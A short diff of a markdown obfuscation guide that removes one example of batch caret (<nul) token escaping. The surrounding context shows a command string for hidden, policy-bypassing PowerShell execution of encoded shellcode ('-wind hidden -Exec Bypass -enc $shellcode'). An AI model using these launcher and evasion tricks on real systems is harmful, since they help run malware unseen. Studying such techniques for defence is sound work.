@@ -99,7 +99,6 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
       Using a batch redirection caret (<nul) to 'escape' tokens.
       'If you place a token at the caret the token is removed'.
-       example: cmd.exe <nul /c start <nul calc == cmd.exe /c start calc
 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
